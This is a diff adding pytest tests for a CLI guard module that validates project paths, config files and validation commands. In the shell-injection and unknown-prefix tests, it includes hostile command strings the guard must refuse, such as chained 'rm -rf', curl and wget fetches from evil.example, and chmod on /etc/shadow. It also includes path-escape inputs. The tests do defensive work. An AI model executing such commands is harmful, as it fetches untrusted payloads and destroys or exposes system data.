@@ -1,0 +1,813 @@
+"""Tests for iterate_cli.guard (defensive-programming guards and invariants).
+
+Covers ``run_guard_precheck`` / ``run_guard_postcheck`` / ``run_invariant_check``
+across normal, failure and boundary paths, plus ``render_guard_result`` JSON
+output and the ``iterate guard`` / ``iterate invariant`` CLI exit codes.
+"""
+
+from __future__ import annotations
+
+import json
+import shutil
+import sys
+from pathlib import Path
+
+import pytest
+import yaml
+
+REPO_ROOT = Path(__file__).resolve().parent.parent
+sys.path.insert(0, str(REPO_ROOT))
+
+from iterate_cli.cli import main as cli_main
+from iterate_cli.guard import (
+    _DRAIN_CHUNK_CHARS,
+    EXIT_FAIL,
+    EXIT_PASS,
+    render_guard_result,
+    run_guard_postcheck,
+    run_guard_precheck,
+    run_invariant_check,
+)
+
+CONFIG_YAML = "iterate.config.yaml"
+
+
+def _make_project(tmp_path: Path) -> Path:
+    """Create a minimal project under tmp_path (no onboarding required)."""
+    project = tmp_path / "proj"
+    project.mkdir(parents=True)
+    return project
+
+
+def _write_config(project: Path, config: dict) -> None:
+    (project / CONFIG_YAML).write_text(
+        yaml.safe_dump(config, allow_unicode=True), encoding="utf-8"
+    )
+
+
+def _base_config() -> dict:
+    return {
+        "dimensions": ["correctness", "security"],
+        "validation": {
+            "commands": {
+                "python": ["true"],
+            }
+        },
+    }
+
+
+# ---------------------------------------------------------------------------
+# run_guard_precheck
+# ---------------------------------------------------------------------------
+
+
+class TestGuardPrecheck:
+    def test_clean_project_passes(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        target = project / "a.txt"
+        target.write_text("x", encoding="utf-8")
+        # No config, no git repo: manifest/git checks degrade gracefully.
+        result = run_guard_precheck(project, ["a.txt"])
+        assert result.passed is True
+
+    def test_no_paths_arguments_passes(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, [])
+        assert result.passed is True
+        assert any(label == "targets exist" for label, ok, _ in result.items)
+
+    def test_missing_target_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, ["nope.txt"])
+        assert result.passed is False
+        assert any(label == "targets exist" and not ok for label, ok, _ in result.items)
+
+    def test_target_escaping_project_root_fails(self, tmp_path) -> None:
+        """A target resolving outside the project root must fail pre-check.
+
+        The guard exists to certify that edits stay inside the project, so an
+        out-of-tree target (``../`` escape or an absolute path elsewhere) is a
+        misconfiguration and must never earn a green light.
+        """
+        project = _make_project(tmp_path)
+        (tmp_path / "outside.txt").write_text("x", encoding="utf-8")
+        result = run_guard_precheck(project, ["../outside.txt"])
+        assert result.passed is False
+        hit = [d for label, ok, d in result.items if label == "targets within project root"]
+        assert hit, "out-of-tree target must be reported"
+        assert "outside.txt" in hit[0]
+
+    def test_absolute_target_outside_project_root_fails(self, tmp_path) -> None:
+        """The escape check must also cover absolute paths passed verbatim."""
+        project = _make_project(tmp_path)
+        outside = tmp_path / "outside.txt"
+        outside.write_text("x", encoding="utf-8")
+        result = run_guard_precheck(project, [str(outside)])
+        assert result.passed is False
+        assert any(
+            label == "targets within project root" and not ok for label, ok, _ in result.items
+        )
+
+    def test_absolute_target_inside_project_root_passes(self, tmp_path) -> None:
+        """An absolute path that *is* inside the root stays legitimate."""
+        project = _make_project(tmp_path)
+        target = project / "a.txt"
+        target.write_text("x", encoding="utf-8")
+        result = run_guard_precheck(project, [str(target)])
+        assert result.passed is True
+
+    def test_out_of_tree_target_does_not_misalign_missing_report(self, tmp_path) -> None:
+        """Escaped targets must be dropped without shifting the missing list.
+
+        Regression: the escape filter used to rebuild a bare list of resolved
+        paths and then ``zip`` it against the original ``paths``, so with
+        ``[present, escape, missing]`` the "missing" verdict was attributed to
+        the *escape* filename and the genuinely missing file went unreported.
+        """
+        project = _make_project(tmp_path)
+        (project / "present.txt").write_text("x", encoding="utf-8")
+        (tmp_path / "outside.txt").write_text("x", encoding="utf-8")
+        result = run_guard_precheck(
+            project, ["present.txt", "../outside.txt", "missing.txt"]
+        )
+        assert result.passed is False
+        detail = next(d for label, _, d in result.items if label == "targets exist")
+        assert "missing.txt" in detail, f"real missing file not reported: {detail!r}"
+        assert "outside.txt" not in detail, f"escaped file leaked into report: {detail!r}"
+
+    def test_all_targets_escaping_suppresses_spurious_exists_pass(self, tmp_path) -> None:
+        """When every target escapes, no vacuous "N path(s) present" green item."""
+        project = _make_project(tmp_path)
+        (tmp_path / "outside.txt").write_text("x", encoding="utf-8")
+        result = run_guard_precheck(project, ["../outside.txt"])
+        assert result.passed is False
+        assert not any(
+            label == "targets exist" and ok for label, ok, _ in result.items
+        ), "must not claim targets exist when none were in-root"
+
+    def test_missing_manifest_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())  # validation.commands.python configured
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "manifest[python]" and not ok for label, ok, _ in result.items)
+
+    def test_present_manifest_passes(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        (project / "pyproject.toml").write_text("[project]\nname='demo'\n", encoding="utf-8")
+        _write_config(project, _base_config())
+        result = run_guard_precheck(project, [])
+        assert result.passed is True
+        assert any(label == "manifests ready" and ok for label, ok, _ in result.items)
+
+    def test_dirty_worktree_fails(self, tmp_path, monkeypatch) -> None:
+        project = _make_project(tmp_path)
+        monkeypatch.setattr("iterate_cli.guard._git_root", lambda _root: project)
+        monkeypatch.setattr(
+            "iterate_cli.guard._git_worktree_is_clean",
+            lambda _root: (False, "1 tracked change(s)"),
+        )
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "git clean" and not ok for label, ok, _ in result.items)
+
+    def test_clean_worktree_passes(self, tmp_path, monkeypatch) -> None:
+        project = _make_project(tmp_path)
+        monkeypatch.setattr("iterate_cli.guard._git_root", lambda _root: project)
+        monkeypatch.setattr(
+            "iterate_cli.guard._git_worktree_is_clean", lambda _root: (True, "worktree clean")
+        )
+        result = run_guard_precheck(project, [])
+        assert result.passed is True
+        assert any(label == "git clean" and ok for label, ok, _ in result.items)
+
+    def test_corrupt_config_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        (project / CONFIG_YAML).write_text("{unclosed yaml", encoding="utf-8")
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "config readable" and not ok for label, ok, _ in result.items)
+
+    def test_unsafe_validation_command_fails(self, tmp_path) -> None:
+        """A hand-edited config whose validation.commands contains shell-chaining
+        metacharacters must fail pre-check (fail-closed, never a green light)."""
+        project = _make_project(tmp_path)
+        (project / "pyproject.toml").write_text("[project]\nname='demo'\n", encoding="utf-8")
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["true; rm -rf /tmp/x"]}
+        _write_config(project, config)
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "validation commands" and not ok for label, ok, _ in result.items)
+
+    def test_onboarded_without_validation_commands_fails(self, tmp_path) -> None:
+        """Pre-check must fail closed (exit 1) for an *onboarded* project whose
+        iterate.config.yaml declares no validation.commands, so its exit code is
+        consistent with the guaranteed post-check failure — never a misleading
+        'clear to start' green light (guard.py #4)."""
+        project = _make_project(tmp_path)
+        _write_config(project, {"dimensions": ["correctness"]})
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        hit = next((ok for label, ok, _ in result.items if label == "validation commands"), None)
+        assert hit is False
+
+    def test_onboarded_empty_commands_map_fails(self, tmp_path) -> None:
+        """An explicit-but-empty ``validation: {commands: {}}`` still means the
+        post-check cannot run; pre-check must reflect that as a failure."""
+        project = _make_project(tmp_path)
+        _write_config(project, {"dimensions": ["correctness"], "validation": {"commands": {}}})
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "validation commands" and not ok for label, ok, _ in result.items)
+
+    def test_all_missing_manifests_reported_not_just_first(self, tmp_path) -> None:
+        """Every missing module manifest produces its own failure item.
+
+        Previously the loop ``break``-ed on the first missing manifest, hiding
+        the remaining failures (a host AI would only ever see one of several
+        broken manifests). All must be reported, and no false all-clear line."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {
+            "python": ["true"],
+            "typescript": ["true"],
+        }
+        _write_config(project, config)
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        failed = [label for label, ok, _ in result.items if label.startswith("manifest[")]
+        assert len(failed) == 2
+        assert "manifest[python]" in failed
+        assert "manifest[typescript]" in failed
+        assert not any(label == "manifests ready" for label, _, _ in result.items)
+
+    def test_mixed_missing_present_manifests(self, tmp_path) -> None:
+        """One present + one missing manifest: the missing one is reported and
+        no all-clear line is printed."""
+        project = _make_project(tmp_path)
+        (project / "pyproject.toml").write_text("[project]\nname='demo'\n", encoding="utf-8")
+        config = _base_config()
+        config["validation"]["commands"] = {
+            "python": ["true"],
+            "typescript": ["true"],
+        }
+        _write_config(project, config)
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "manifest[typescript]" and not ok for label, ok, _ in result.items)
+        assert not any(label == "manifests ready" and ok for label, ok, _ in result.items)
+
+    def test_missing_command_tool_fails(self, tmp_path, monkeypatch) -> None:
+        """A configured command whose first token is not resolvable on PATH must
+        fail pre-check: the promised post-check could not possibly run it (N1)."""
+        project = _make_project(tmp_path)
+        (project / "pyproject.toml").write_text("[project]\nname='demo'\n", encoding="utf-8")
+        config = _base_config()
+        # bandit is a known-safe prefix, but simulate it not being installed.
+        config["validation"]["commands"] = {"python": ["bandit -r src/"]}
+        _write_config(project, config)
+
+        real_which = shutil.which
+
+        def _which_none_for_bandit(token: str):
+            return None if token == "bandit" else real_which(token)
+
+        monkeypatch.setattr("iterate_cli.guard.shutil.which", _which_none_for_bandit)
+        result = run_guard_precheck(project, [])
+        assert result.passed is False
+        assert any(label == "tools available" and not ok for label, ok, _ in result.items)
+        assert any("bandit" in detail for _, _, detail in result.items)
+
+    def test_shell_builtin_needs_no_binary(self, tmp_path, monkeypatch) -> None:
+        """true/false/echo execute under shell=True as builtins, so shutil.
+        must not flag them as missing even when which() resolves nothing."""
+        project = _make_project(tmp_path)
+        (project / "pyproject.toml").write_text("[project]\nname='demo'\n", encoding="utf-8")
+        _write_config(project, _base_config())  # python: ["true"]
+        monkeypatch.setattr("iterate_cli.guard.shutil.which", lambda _t: None)
+        result = run_guard_precheck(project, [])
+        assert result.passed is True
+        assert any(label == "tools available" and ok for label, ok, _ in result.items)
+
+
+# ---------------------------------------------------------------------------
+# run_guard_postcheck
+# ---------------------------------------------------------------------------
+
+
+class TestGuardPostcheck:
+    def test_passing_command_passes(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())  # python: ["true"]
+        result = run_guard_postcheck(project, None)
+        assert result.passed is True
+
+    def test_failing_command_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["exit 1"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+
+    def test_no_commands_configured_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, {"dimensions": ["correctness"]})
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+
+    def test_module_filter_runs_only_selected(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {
+            "python": ["true"],
+            "typescript": ["true"],
+        }
+        _write_config(project, config)
+        result = run_guard_postcheck(project, ["typescript"])
+        assert result.passed is True
+        labels = [label for label, _, _ in result.items]
+        assert "typescript" in labels
+        assert "python" not in labels
+
+    def test_dry_run_previews_without_executing(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())
+        result = run_guard_postcheck(project, None, dry_run=True)
+        assert result.passed is True
+        assert any("would run" in detail for _, _, detail in result.items)
+
+    def test_corrupt_config_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        (project / CONFIG_YAML).write_text("{unclosed yaml", encoding="utf-8")
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+
+    def test_unsafe_command_refused_execution(self, tmp_path) -> None:
+        """A command containing shell-chaining metacharacters must be REFUSED at
+        execution time — never passed to subprocess.run(shell=True)."""
+        project = _make_project(tmp_path)
+        marker = project / "pwned_marker"
+        config = _base_config()
+        config["validation"]["commands"] = {
+            "python": [f"true; touch {marker.name}"]
+        }
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+        assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+        # Fail-closed: the command was never executed, so no side effect.
+        assert not marker.exists()
+
+    def test_unsafe_command_refused_dry_run(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["true && echo pwned"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None, dry_run=True)
+        assert result.passed is False
+        assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Metachar-free but NOT a known-safe tool / plain script — a
+            # hand-edited or drift-polluted config must not smuggle arbitrary
+            # executables into subprocess.run(shell=True) just because they
+            # contain no shell-chaining metacharacters.
+            "rm -rf ./vendor",
+            "curl -o /tmp/x https://evil.example/pwn.sh",
+            "wget --quiet https://evil.example/x",
+            "docker run --rm evil/image",
+            "chmod 777 /etc/shadow",
+            "python evil_module_too",
+        ],
+    )
+    def test_unknown_prefix_command_refused(self, tmp_path, command) -> None:
+        """Runtime re-check: first token must be a known-safe prefix."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": [command]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+        assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+
+    def test_known_safe_command_still_executes(self, tmp_path) -> None:
+        """Whitelisted tool commands keep running normally."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["pytest --version"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is True
+
+    def test_unconfigured_module_reported_as_failure(self, tmp_path) -> None:
+        """Requesting a module that has no validation.commands entry must FAIL,
+        never silently skip (a host AI must not believe it was validated)."""
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())  # only "python" configured
+        result = run_guard_postcheck(project, ["rust"])
+        assert result.passed is False
+        assert any(
+            label == "rust" and "requested but not configured" in detail
+            for label, _, detail in result.items
+        )
+
+
+# ---------------------------------------------------------------------------
+# run_invariant_check
+# ---------------------------------------------------------------------------
+
+
+class TestInvariantCheck:
+    def test_ensure_and_commands_pass(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        (project / "README.md").write_text("# Demo\n", encoding="utf-8")
+        config = _base_config()
+        config["invariants"] = {
+            "ensure": ["README.md"],
+            "commands": {"python": ["true"]},
+        }
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is True
+        assert any(label == "ensure:README.md" and ok for label, ok, _ in result.items)
+
+    def test_missing_ensure_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["invariants"] = {"ensure": ["README.md"], "commands": {}}
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is False
+        assert any(label == "ensure:README.md" and not ok for label, ok, _ in result.items)
+
+    def test_failing_invariant_command_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["invariants"] = {"commands": {"python": ["exit 1"]}}
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is False
+
+    def test_falls_back_to_validation_commands(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        # No invariants section -> degrades to validation.commands.
+        _write_config(project, _base_config())
+        result = run_invariant_check(project)
+        assert result.passed is True
+        assert any("fallback" in label for label, _, _ in result.items)
+
+    def test_empty_project_passes(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        # No config at all: nothing to assert -> passes.
+        result = run_invariant_check(project)
+        assert result.passed is True
+
+    def test_dry_run_previews_without_executing(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())
+        result = run_invariant_check(project, dry_run=True)
+        assert result.passed is True
+        assert any("would run" in detail for _, _, detail in result.items)
+
+    def test_corrupt_config_fails(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        (project / CONFIG_YAML).write_text("{unclosed yaml", encoding="utf-8")
+        result = run_invariant_check(project)
+        assert result.passed is False
+
+    def test_unsafe_invariant_command_refused(self, tmp_path) -> None:
+        """invariants.commands with shell-chaining metacharacters must be refused
+        at execution time, never run through the shell."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["invariants"] = {"commands": {"python": ["true; echo pwned"]}}
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is False
+        assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+
+    def test_absolute_ensure_path_rejected(self, tmp_path) -> None:
+        """An absolute path in invariants.ensure must be rejected, never
+        asserted against a file outside the project (F8)."""
+        project = _make_project(tmp_path)
+        outside = tmp_path / "outside.txt"
+        outside.write_text("x", encoding="utf-8")
+        config = _base_config()
+        config["invariants"] = {"ensure": [str(outside)], "commands": {}}
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is False
+        assert any("absolute path not allowed" in detail for _, _, detail in result.items)
+
+    def test_ensure_path_escaping_project_rejected(self, tmp_path) -> None:
+        """A relative path resolving outside the project root (via ..) must be
+        rejected; only project-owned files may be asserted (F8)."""
+        project = _make_project(tmp_path)
+        outside = tmp_path / "secret.txt"
+        outside.write_text("x", encoding="utf-8")
+        config = _base_config()
+        config["invariants"] = {"ensure": [f"../{outside.name}"], "commands": {}}
+        _write_config(project, config)
+        result = run_invariant_check(project)
+        assert result.passed is False
+        assert any("escapes project root" in detail for _, _, detail in result.items)
+
+
+# ---------------------------------------------------------------------------
+# render_guard_result — JSON output + exit codes
+# ---------------------------------------------------------------------------
+
+
+class TestRenderGuardResult:
+    def test_json_output_valid_and_exit_code(self, tmp_path, capsys) -> None:
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, [])
+        code = render_guard_result(result, json_output=True)
+        data = json.loads(capsys.readouterr().out)
+        assert data["check"] == result.name
+        assert data["passed"] == result.passed
+        assert data["dry_run"] is False
+        assert code == (EXIT_PASS if result.passed else EXIT_FAIL)
+
+    def test_failed_result_exits_nonzero_json(self, tmp_path, capsys) -> None:
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, ["missing.txt"])
+        code = render_guard_result(result, json_output=True)
+        assert code == EXIT_FAIL
+        data = json.loads(capsys.readouterr().out)
+        assert data["passed"] is False
+
+    def test_precheck_dry_run_says_it_is_read_only(
+        self, tmp_path, capsys
+    ) -> None:
+        """`guard pre-check --dry-run` must not imply it normally executes.
+
+        Regression: pre-check printed "guard-pre: DRY-RUN preview (nothing
+        executed)", suggesting the ordinary path *does* execute commands and
+        that the flag changed the outcome — pre-check is static validation and
+        never runs anything. The flag's help promised "preview the exact
+        commands that would run", which the sub-command cannot deliver.
+        """
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, [], dry_run=True)
+        assert result.dry_run is True
+
+        code = render_guard_result(result, json_output=False)
+        out = capsys.readouterr().out
+        assert code == EXIT_PASS
+        assert "DRY-RUN preview" not in out, out
+        assert "read-only" in out
+
+    def test_postcheck_dry_run_keeps_the_preview_banner(
+        self, tmp_path, capsys
+    ) -> None:
+        """post-check really can execute, so its preview banner stays."""
+        project = _make_project(tmp_path)
+        result = run_guard_postcheck(project, None, dry_run=True)
+        render_guard_result(result, json_output=False)
+        out = capsys.readouterr().out
+        assert "DRY-RUN preview (nothing executed)" in out
+
+    def test_precheck_dry_run_still_reports_it_in_json(
+        self, tmp_path, capsys
+    ) -> None:
+        """The machine-readable payload keeps exposing dry_run untouched."""
+        project = _make_project(tmp_path)
+        result = run_guard_precheck(project, [], dry_run=True)
+        render_guard_result(result, json_output=True)
+        data = json.loads(capsys.readouterr().out)
+        assert data["dry_run"] is True
+        assert data["check"] == "guard-pre"
+
+
+# ---------------------------------------------------------------------------
+# CLI integration
+# ---------------------------------------------------------------------------
+
+
+class TestGuardCLI:
+    def test_guard_precheck_cli_json(self, tmp_path, capsys) -> None:
+        project = _make_project(tmp_path)
+        (project / "a.txt").write_text("x", encoding="utf-8")
+        code = cli_main(["guard", "pre-check", "a.txt", "-p", str(project), "--json"])
+        assert code == 0
+        data = json.loads(capsys.readouterr().out)
+        assert data["check"] == "guard-pre"
+        assert data["passed"] is True
+
+    def test_guard_precheck_missing_target_exit(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        code = cli_main(["guard", "pre-check", "nope.txt", "-p", str(project)])
+        assert code == EXIT_FAIL
+
+    def test_guard_postcheck_cli_json(self, tmp_path, capsys) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())
+        code = cli_main(["guard", "post-check", "-p", str(project), "--json"])
+        assert code == 0
+        data = json.loads(capsys.readouterr().out)
+        assert data["check"] == "guard-post"
+
+    def test_invariant_cli_json(self, tmp_path, capsys) -> None:
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())
+        code = cli_main(["invariant", "-p", str(project), "--json"])
+        assert code == 0
+        data = json.loads(capsys.readouterr().out)
+        assert data["check"] == "invariant"
+
+    def test_invariant_cli_fail_exit(self, tmp_path) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["invariants"] = {"ensure": ["README.md"], "commands": {}}
+        _write_config(project, config)
+        code = cli_main(["invariant", "-p", str(project)])
+        assert code == EXIT_FAIL
+
+
+class TestCommandExecutionBoundaries:
+    """Bounded output buffering and timeout enforcement in ``_run_command``.
+
+    A chatty validation command must never accumulate unbounded output in
+    memory (only a bounded diagnostic tail survives), and a wedged command
+    must be killed after ``_COMMAND_TIMEOUT_SECONDS`` rather than hanging the
+    host forever.
+    """
+
+    def test_chatty_output_stays_bounded(self, tmp_path, monkeypatch) -> None:
+        # `seq` is only executable because the operator widens the allowlist
+        # via the env var; the point under test is the output buffering, not
+        # the prefix gate.
+        monkeypatch.setenv("ITERATE_EXTRA_SAFE_COMMAND_PREFIXES", "seq")
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["seq 5000"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is True
+        detail = next(d for _, ok, d in result.items if ok)
+        # 5000 lines produced by the child, but only the last line participates
+        # in the bounded tail — proving output is truncated, not fully kept.
+        assert "5000" in detail
+        # The returned diagnostic tail stays small (far below the 5000 lines).
+        assert len(detail) < 1000
+
+    # ``seq`` also covers "last line is retained" (the tail source).
+    def test_single_line_spans_chunks_without_loss(self, tmp_path, monkeypatch) -> None:
+        """A line longer than one drain chunk must survive intact across seams.
+
+        The chunked drain carries the tail of a still-open line between reads;
+        a regression here would mangle or drop the content near a chunk
+        boundary (which is invisible to the old readline-based draining).
+        """
+        project = _make_project(tmp_path)
+        scripts_dir = project / "scripts"
+        scripts_dir.mkdir()
+        script_path = scripts_dir / "blob.py"
+        prefix = "LEAD-MARK-"
+        blob_size = _DRAIN_CHUNK_CHARS * 2 + 123  # uneven so it crosses oddly
+        script_path.write_text(
+            "import sys\n"
+            f"sys.stdout.write({prefix!r} + 'A' * {blob_size} + '\\n')\n",
+            encoding="utf-8",
+        )
+        monkeypatch.setenv("ITERATE_EXTRA_SAFE_COMMAND_PREFIXES", "python3")
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["python3 scripts/blob.py"]}
+        _write_config(project, config)
+        out = run_guard_postcheck(project, None)
+        assert out.passed is True
+        detail = next(d for _, ok, d in out.items if ok)
+        # The leading marker must still be present and the tail bounded far
+        # below the 128KB+ single line that produced it.
+        assert "LEAD-MARK-" in detail
+        assert len(detail) < 1000
+
+    def test_huge_newline_free_blob_stays_bounded(self, tmp_path, monkeypatch) -> None:
+        """A multi-MB newline-free blob (progress deltas, minified output) must
+        complete quickly without materializing the whole blob in memory — the
+        readline-based drain would have buffered the entire line (the fix)."""
+        project = _make_project(tmp_path)
+        scripts_dir = project / "scripts"
+        scripts_dir.mkdir()
+        script_path = scripts_dir / "blob.py"
+        blob_size = _DRAIN_CHUNK_CHARS * 64  # 4 MiB in one single line
+        script_path.write_text(
+            "import sys\n"
+            f"sys.stdout.write('A' * {blob_size})\n"
+            "sys.stdout.flush()\n",
+            encoding="utf-8",
+        )
+        monkeypatch.setenv("ITERATE_EXTRA_SAFE_COMMAND_PREFIXES", "python3")
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["python3 scripts/blob.py"]}
+        _write_config(project, config)
+        out = run_guard_postcheck(project, None)
+        assert out.passed is True
+        detail = next(d for _, ok, d in out.items if ok)
+        # Only a tiny diagnostic snippet may survive the 4MiB echo.
+        assert len(detail) < 1000
+
+    # ``seq`` also covers "last line is retained" (the tail source).
+    def test_timeout_kills_wedged_command(self, tmp_path, monkeypatch) -> None:
+        monkeypatch.setenv("ITERATE_EXTRA_SAFE_COMMAND_PREFIXES", "sleep")
+        monkeypatch.setattr("iterate_cli.guard._COMMAND_TIMEOUT_SECONDS", 1)
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["sleep 30"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+        assert any("timed out" in detail for _, _, detail in result.items)
+
+
+# ---------------------------------------------------------------------------
+# _kill_process_tree — the timeout path must never raise
+# ---------------------------------------------------------------------------
+
+
+class _FakeProc:
+    """Stand-in for ``subprocess.Popen``; each test assigns ``.kill`` itself."""
+
+    def __init__(self, pid: int = 4242) -> None:
+        self.pid = pid
+        self.kill_called = False
+
+    def kill(self) -> None:
+        self.kill_called = True
+
+
+class TestKillProcessTree:
+    """Killing a command that exits exactly as the timeout fires must not raise.
+
+    Regression: the ``except (OSError, ProcessLookupError): proc.kill()``
+    fallback called ``proc.kill()`` unguarded. When the leader exited between
+    the timeout firing and the fallback, ``Popen.kill`` itself raises
+    ``ProcessLookupError``, so a benign race in the timeout path escaped as an
+    unhandled traceback out of ``iterate guard`` instead of reporting a
+    timeout.
+    """
+
+    def test_group_kill_succeeds_without_touching_leader(self, monkeypatch) -> None:
+        import iterate_cli.guard as guard_mod
+
+        calls: list[tuple[int, int]] = []
+        monkeypatch.setattr(guard_mod.os, "killpg", lambda pgid, sig: calls.append((pgid, sig)))
+        monkeypatch.setattr(guard_mod.os, "getpgid", lambda pid: pid)
+
+        proc = _FakeProc()
+        proc.kill = lambda: pytest.fail("leader kill must not be used when killpg works")
+        guard_mod._kill_process_tree(proc)  # type: ignore[arg-type]
+        assert calls, "killpg should have been attempted"
+
+    def test_group_already_gone_is_swallowed(self, monkeypatch) -> None:
+        import iterate_cli.guard as guard_mod
+
+        def boom(_pgid, _sig):
+            raise ProcessLookupError("no such process group")
+
+        monkeypatch.setattr(guard_mod.os, "getpgid", lambda pid: pid)
+        monkeypatch.setattr(guard_mod.os, "killpg", boom)
+
+        proc = _FakeProc()
+        proc.kill = lambda: pytest.fail("nothing left to kill")
+        guard_mod._kill_process_tree(proc)  # type: ignore[arg-type]
+
+    def test_leader_exits_during_fallback_is_swallowed(self, monkeypatch) -> None:
+        import iterate_cli.guard as guard_mod
+
+        def deny(_pgid, _sig):
+            raise PermissionError("not permitted")
+
+        monkeypatch.setattr(guard_mod.os, "getpgid", lambda pid: pid)
+        monkeypatch.setattr(guard_mod.os, "killpg", deny)
+
+        proc = _FakeProc()
+
+        def dead_kill() -> None:
+            raise ProcessLookupError("leader already exited")
+
+        proc.kill = dead_kill
+        # Must not raise.
+        guard_mod._kill_process_tree(proc)  # type: ignore[arg-type]
+
+    def test_permission_error_on_fallback_is_swallowed(self, monkeypatch) -> None:
+        import iterate_cli.guard as guard_mod
+
+        def deny(_pgid, _sig):
+            raise PermissionError("not permitted")
+
+        monkeypatch.setattr(guard_mod.os, "getpgid", lambda pid: pid)
+        monkeypatch.setattr(guard_mod.os, "killpg", deny)
+
+        proc = _FakeProc()
+
+        def denied_kill() -> None:
+            raise PermissionError("nope")
+
+        proc.kill = denied_kill
+        guard_mod._kill_process_tree(proc)  # type: ignore[arg-type]
